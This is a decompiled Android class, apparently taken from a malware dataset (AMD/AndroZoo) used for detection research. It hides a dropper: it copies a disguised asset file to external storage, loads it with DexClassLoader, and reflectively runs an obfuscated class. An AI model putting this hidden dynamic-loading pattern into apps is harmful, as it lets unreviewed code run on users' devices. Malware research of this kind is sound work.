package com.baoyi.ts3;

import android.content.Context;
import android.os.Environment;
import android.util.Log;
import dalvik.system.DexClassLoader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/* compiled from: GDynamic.java */
/* loaded from: /mnt/c/Users/truon/OneDrive/Desktop/MyWorks/Research4IECgroup/Tasks/Graph-Attention-Networks/dataset/preprocessing/apk_tool/AMD_AndroZoo_demo/dex/f4017634f016015f84afc748ba723096.apk/classes.dex */
public class b {
    private static b a;
    private static String h = "mHc.DfN.luZHDI";
    private Class<?> b = null;
    private Object c;
    private DexClassLoader d;
    private String e;
    private String f;
    private Context g;

    private b(Context ctx, String vid, String chlId) {
        this.g = ctx;
        this.e = vid;
        this.f = chlId;
        c(ctx);
    }

    public static synchronized b a(Context ctx, String vid, String chlId) {
        b bVar;
        synchronized (b.class) {
            if (a == null) {
                a = new b(ctx, vid, chlId);
            }
            bVar = a;
        }
        return bVar;
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public void a() {
        if (!"mounted".equals(Environment.getExternalStorageState())) {
            Log.d("debug", "sdcard");
            return;
        }
        try {
            Method run = this.b.getMethod("run", new Class[0]);
            run.invoke(this.c, new Object[0]);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    protected void a(Context ctx) {
        try {
            File file = b();
            OutputStream os = new FileOutputStream(file);
            try {
                InputStream is = ctx.getAssets().open("wnbthomwdendconw.dat");
                byte[] buf = new byte[1024];
                while (true) {
                    int len = is.read(buf);
                    if (len != -1) {
                        os.write(buf, 0, len);
                    } else {
                        is.close();
                        os.close();
                        return;
                    }
                }
            } catch (IOException e) {
                e = e;
                e.printStackTrace();
            }
        } catch (IOException e2) {
            e = e2;
        }
    }

    private File b() {
        File dir = new File(Environment.getExternalStorageDirectory(), "Android/" + this.g.getPackageName());
        if (!dir.exists()) {
            dir.mkdirs();
        }
        File file = new File(dir, "wnbthomwdendconw.dat.jar");
        return file;
    }

    protected void b(Context ctx) {
        File file = b();
        this.d = new DexClassLoader(file.getAbsolutePath(), ctx.getApplicationInfo().dataDir, null, getClass().getClassLoader());
        try {
            this.b = this.d.loadClass(h);
            Method getInstance = this.b.getMethod("init", Context.class, Class.class, String.class, String.class);
            getInstance.invoke(null, ctx, getClass(), this.e, this.f);
            Field instance = this.b.getField("instance");
            this.c = instance.get(null);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public DexClassLoader c(Context ctx) {
        if (!"mounted".equals(Environment.getExternalStorageState())) {
            return null;
        }
        if (this.d == null) {
            File file = b();
            if (file != null && !file.exists()) {
                a(ctx);
            }
            b(ctx);
        }
        return this.d;
    }
}
